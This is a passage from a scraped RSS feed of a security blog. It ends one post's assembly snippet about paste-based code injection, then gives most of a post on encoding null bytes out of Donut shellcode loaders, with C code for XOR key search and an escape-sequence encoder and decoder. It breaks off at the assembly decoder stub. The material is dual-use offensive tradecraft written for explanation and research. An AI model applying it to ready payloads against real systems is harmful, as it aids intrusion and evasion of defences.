style=\"color: #008c00;\">0</span>            <span style=\"color: #696969;\">; set carry</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rax              <span style=\"color: #696969;\">; save carry</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rcx              <span style=\"color: #696969;\">; load carry into CL</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rax              <span style=\"color: #696969;\">; restore pointer</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n\n    <span style=\"color: #696969;\">; step 4</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rax              <span style=\"color: #696969;\">; save pointer</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">rol</span>    <span style=\"color: #800000; font-weight: bold;\">dword</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">24</span>    \n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">+</span>r8<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #696969;\">; A[3] += CF</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">adc</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>            <span style=\"color: #696969;\">; set carry</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rax              <span style=\"color: #696969;\">; save carry</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rcx              <span style=\"color: #696969;\">; load carry into CL</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rax              <span style=\"color: #696969;\">; restore pointer</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    \n    <span style=\"color: #696969;\">; step 5</span>\n    <span style=\"color: #800000; font-weight: bold;\">rol</span>    <span style=\"color: #800000; font-weight: bold;\">dword</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">24</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 21:15:17 UTC --></p>\n<p>As you can see, it&#8217;s a mess to try simulate instructions instead of just writing the code to memory and executing that way&#8230;or use CF_UNICODETEXT for copying to the clipboard. \ud83d\ude09</p>\n<div><a href=\"https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/\"><img alt=\"em_demo\" height=\"120\" src=\"https://videos.files.wordpress.com/wyrPJIZZ/ezgif.com-gif-maker1_std.original.jpg\" width=\"160\" /></a></div>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/feed/",
            "slash_comments": "3",
            "media_thumbnail": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/07/calc_ss.png"
                },
                {
                    "url": "https://videos.files.wordpress.com/wyrPJIZZ/ezgif.com-gif-maker1_hd.original.jpg",
                    "width": "256",
                    "height": "192"
                }
            ],
            "href": "",
            "media_content": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/07/calc_ss.png",
                    "medium": "image"
                },
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                },
                {
                    "url": "https://modexp.files.wordpress.com/2020/07/notepad_windbg_search.png",
                    "medium": "image"
                },
                {
                    "url": "https://modexp.files.wordpress.com/2020/07/em_handle_windbg.png",
                    "medium": "image"
                },
                {
                    "url": "https://modexp.files.wordpress.com/2020/07/windbg_memory_buffer_notepad.png",
                    "medium": "image"
                },
                {
                    "width": "400",
                    "height": "300"
                }
            ],
            "media_player": {
                "url": "https://videopress.com/v/wyrPJIZZ",
                "content": ""
            },
            "media_rating": {
                "scheme": "urn:mpaa",
                "content": "g"
            },
            "rating": "g"
        },
        {
            "title": "Shellcode: Encoding Null Bytes Faster With Escape Sequences",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Shellcode: Encoding Null Bytes Faster With Escape Sequences"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2020/06/26/shellcode-encoding-null-bytes-faster/"
                }
            ],
            "link": "https://modexp.wordpress.com/2020/06/26/shellcode-encoding-null-bytes-faster/",
            "comments": "https://modexp.wordpress.com/2020/06/26/shellcode-encoding-null-bytes-faster/#comments",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Fri, 26 Jun 2020 09:00:49 +0000",
            "published_parsed": [
                2020,
                6,
                26,
                9,
                0,
                49,
                4,
                178,
                0
            ],
            "tags": [
                {
                    "term": "assembly",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "donut",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "security",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shellcode",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "windows",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "encoding",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "null bytes",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=4856",
            "guidislink": false,
            "summary": "Introduction Quick post about a common problem removing null bytes in the loader generated by Donut. Replacing opcodes that contain null bytes with equivalent snippets is enough to solve the problem for a shellcode of no more than a few &#8230; <a href=\"https://modexp.wordpress.com/2020/06/26/shellcode-encoding-null-bytes-faster/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Introduction Quick post about a common problem removing null bytes in the loader generated by Donut. Replacing opcodes that contain null bytes with equivalent snippets is enough to solve the problem for a shellcode of no more than a few &#8230; <a href=\"https://modexp.wordpress.com/2020/06/26/shellcode-encoding-null-bytes-faster/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
                    "value": "<h2>Introduction</h2>\n<p>Quick post about a common problem removing null bytes in the loader generated by <a href=\"https://github.com/TheWover/donut\">Donut</a>. Replacing opcodes that contain null bytes with equivalent snippets is enough to solve the problem for a shellcode of no more than a few hundred bytes. It&#8217;s also possible to automate using encoders found in <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom\">msfvenom</a> and <a href=\"https://github.com/Gallopsled/pwntools\">pwntools</a>. However, the problem most users experience is when the loader generated by Donut is a few hundred kilobytes or even a few megabytes! This post demonstrates how to use escape sequences to facilitate faster encoding of null bytes. Maybe &#8220;escape codes&#8221; is a better description? You can find <a href=\"https://gist.github.com/odzhan/d55645fe22e61883b023ef4a48a82cf7\">a PoC encoder here</a>, which can be used to add an x86/AMD64 decoder to a shellcode generated by Donut.</p>\n<h2>XOR Cipher</h2>\n<p>Readers will be aware of the eXclusive-OR (XOR) cipher and its extensive use as a component or building block in many cryptographic primitives. It&#8217;s also a popular choice for obfuscating shellcode and specifically removing null bytes. In the past, the following code in C is what I&#8217;d probably use to find a suitable key. It will work with keys of any length, but is slow as hell for anything more than 24-Bits.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">int</span> find_xor_key<span style=\"color: #808030;\">(</span>\n  <span style=\"color: #800000; font-weight: bold;\">const</span> <span style=\"color: #800000; font-weight: bold;\">void</span> <span style=\"color: #808030;\">*</span>inbuf<span style=\"color: #808030;\">,</span> u32 inlen<span style=\"color: #808030;\">,</span> \n  <span style=\"color: #800000; font-weight: bold;\">void</span> <span style=\"color: #808030;\">*</span>outbuf<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">int</span> outlen<span style=\"color: #808030;\">)</span> \n<span style=\"color: #800080;\">{</span>\n    <span style=\"color: #800000; font-weight: bold;\">int</span> i<span style=\"color: #808030;\">,</span> j<span style=\"color: #808030;\">,</span> keylen<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n    u8  <span style=\"color: #808030;\">*</span>in <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>u8<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>inbuf<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>key<span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">(</span>u8<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>outbuf<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// initialize key</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>outlen<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      key<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>i <span style=\"color: #808030;\">&lt;</span> keylen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">?</span> <span style=\"color: #008c00;\">0</span> <span style=\"color: #800080;\">:</span> <span style=\"color: #808030;\">-</span><span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #696969;\">// while keylen is less than max key requested</span>\n    <span style=\"color: #800000; font-weight: bold;\">while</span><span style=\"color: #808030;\">(</span>keylen <span style=\"color: #808030;\">&lt;</span> outlen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #696969;\">// xor data with current key</span>\n      <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>inlen<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #696969;\">// if the result of xor is zero. end loop</span>\n        <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span>in<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">^</span> key<span style=\"color: #808030;\">[</span>i <span style=\"color: #808030;\">%</span> keylen<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">break</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n      <span style=\"color: #696969;\">// if we processed all data successfully</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>i <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> inlen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #696969;\">// return current key and its length</span>\n        <span style=\"color: #800000; font-weight: bold;\">return</span> keylen<span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n      <span style=\"color: #696969;\">// otherwise, update the key</span>\n      <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> <span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span>key<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">break</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n      <span style=\"color: #696969;\">// update the key length</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>i <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> keylen<span style=\"color: #808030;\">)</span> keylen<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #696969;\">// return nothing found</span>\n    <span style=\"color: #800000; font-weight: bold;\">return</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-06-26 08:38:22 UTC --></p>\n<p>The following function can be used to test it and works relatively fast for something that&#8217;s compact, like 1KB, but sucks for anything &gt; 3072 bytes, which I admit is unusual for shellcode.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">void</span> test_key<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">void</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #800000; font-weight: bold;\">int</span> i<span style=\"color: #808030;\">,</span> keylen<span style=\"color: #800080;\">;</span>\n    u8  key<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> data<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1024</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #603000;\">srand</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">time</span><span style=\"color: #808030;\">(</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// fill buffer with pseudo-random bytes</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span><span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>data<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      data<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">rand</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #696969;\">// try find a suitable XOR key for the data</span>\n    keylen <span style=\"color: #808030;\">=</span> find_xor_key<span style=\"color: #808030;\">(</span>data<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>data<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> key<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>key<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #603000;\">printf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">Suitable key </span><span style=\"color: #007997;\">%s</span><span style=\"color: #0000e6;\">found.</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> \n      keylen <span style=\"color: #800080;\">?</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #800000;\">\"</span> <span style=\"color: #800080;\">:</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">could not be </span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>keylen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #603000;\">printf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">Key length : </span><span style=\"color: #007997;\">%i</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #0000e6;\">Key        : </span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> keylen<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800000; font-weight: bold;\">while</span><span style=\"color: #808030;\">(</span>keylen<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #603000;\">printf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #007997;\">%02x</span><span style=\"color: #0000e6;\"> </span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> key<span style=\"color: #808030;\">[</span>keylen<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n      <span style=\"color: #603000;\">putchar</span><span style=\"color: #808030;\">(</span><span style=\"color: #0000e6;\">'\\n'</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-06-26 08:37:31 UTC --></p>\n<p>find_xor_key() could be re-written to use multiple threads and this would speed up the search. You might even be able to use a GPU or cluster of computers, but the overall problem isn&#8217;t finding a key. We&#8217;re not trying to crack ciphertext. All we want to do is encode and later decode null bytes, and for the Donut loader, this approach is very inefficient.</p>\n<h2>Encoding Algorithm</h2>\n<p>Escape sequences have been used in computing since the 1970s and most of you will already be familiar with them. I&#8217;m not sure if I&#8217;m using the correct terminology for what I describe next, but hopefully you&#8217;ll understand why I did. Textual encoding algorithms like <a href=\"https://tools.ietf.org/rfc/rfc4648.txt\">Base64</a>, <a href=\"https://github.com/woolstar/test/blob/master/encode/asc85.c\">Ascii85</a> and <a href=\"http://base91.sourceforge.net/\">BasE91</a> were considered first of course. And <a href=\"https://twitter.com/a2_qkumba\">Qkumba</a> wrote a very cool base64 decoder that uses just <a href=\"https://github.com/peterferrie/ascii_b64\">ASCII characters</a> that I was very tempted to use. In the end, using an escape code to indicate a null byte is simpler to implement.</p>\n<ol>\n<li>Read a byte from the input file or stream and assign to X.</li>\n<li>Assign X plus 1 to Y.</li>\n<li>If Y is not 0 or 1, goto step 6.</li>\n<li>Save the escape sequence 0x01 to the output file or stream.</li>\n<li>XOR X with predefined 8-Bit key K, goto step 7.</li>\n<li>Add 1 to X.</li>\n<li>Save X to the output file or stream.</li>\n<li>Repeat step 1-7 until EOF.</li>\n</ol>\n<p>Although I use an XOR cipher in step 5, it could be replaced with something else.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">static</span>\n<span style=\"color: #800000; font-weight: bold;\">void</span> nullz_encode<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">FILE</span> <span style=\"color: #808030;\">*</span>in<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">FILE</span> <span style=\"color: #808030;\">*</span>out<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #800000; font-weight: bold;\">char</span> c<span style=\"color: #808030;\">,</span> t<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span><span style=\"color: #800080;\">;</span><span style=\"color: #800080;\">;</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #696969;\">// read byte</span>\n      c <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">getc</span><span style=\"color: #808030;\">(</span>in<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #696969;\">// end of file? exit</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">feof</span><span style=\"color: #808030;\">(</span>in<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">break</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #696969;\">// adding one is just an example</span>\n      t <span style=\"color: #808030;\">=</span> c <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #696969;\">// is the result 0(avoid) or 1(escape)?</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>t <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span> <span style=\"color: #808030;\">|</span><span style=\"color: #808030;\">|</span> t <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #696969;\">// write escape sequence</span>\n        <span style=\"color: #603000;\">putc</span><span style=\"color: #808030;\">(</span><span style=\"color: #008000;\">0x01</span><span style=\"color: #808030;\">,</span> out<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #696969;\">// The XOR is an optional step.</span>\n        <span style=\"color: #696969;\">// Avoid using 0x00 or 0xFF with XOR!</span>\n        <span style=\"color: #603000;\">putc</span><span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">^</span> NULLZ_KEY<span style=\"color: #808030;\">,</span> out<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span> <span style=\"color: #800000; font-weight: bold;\">else</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #696969;\">// save byte plus 1</span>\n        <span style=\"color: #603000;\">putc</span><span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">,</span> out<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-06-26 07:51:14 UTC --></p>\n<h2>Decoding Algorithm</h2>\n<ol>\n<li>Read a byte from the input file or stream and assign to X.</li>\n<li>If X is not an escape sequence 0x01, goto step 5.</li>\n<li>Read a byte from the input file or stream and assign to X.</li>\n<li>XOR X with predefined 8-Bit key K used for encoding, goto step 6.</li>\n<li>Subtract 1 from X.</li>\n<li>Save X to the output file or stream.</li>\n<li>Repeat steps 1-6 until EOF.</li>\n</ol>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">static</span>\n<span style=\"color: #800000; font-weight: bold;\">void</span> nullz_decode<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">FILE</span> <span style=\"color: #808030;\">*</span>in<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">FILE</span> <span style=\"color: #808030;\">*</span>out<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #800000; font-weight: bold;\">char</span> c<span style=\"color: #808030;\">,</span> t<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span><span style=\"color: #800080;\">;</span><span style=\"color: #800080;\">;</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #696969;\">// read byte</span>\n      c <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">getc</span><span style=\"color: #808030;\">(</span>in<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #696969;\">// end of file? exit</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">feof</span><span style=\"color: #808030;\">(</span>in<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">break</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #696969;\">// if this is an escape sequence</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008000;\">0x01</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #696969;\">// read next byte and XOR it</span>\n        c <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">getc</span><span style=\"color: #808030;\">(</span>in<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #696969;\">// The XOR is an optional step.</span>\n        <span style=\"color: #603000;\">putc</span><span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">^</span> NULLZ_KEY<span style=\"color: #808030;\">,</span> out<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span> <span style=\"color: #800000; font-weight: bold;\">else</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #696969;\">// else subtract byte</span>\n        <span style=\"color: #603000;\">putc</span><span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">-</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">,</span> out<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-06-26 07:51:34 UTC --></p>\n<h2>x86/AMD64 assembly</h2>\n<p>This assembly is compatible with both 32-Bit and 64-bit modes. It expects to run from RWX memory, so YMMV with this. If you want to execute from RX memory only, then this will require allocation of memory on the stack.</p>\n<pre style=\"color: #000000; background: #f1f0f0;\">\n    <span style=\"color: #004a43;\">bits</span>   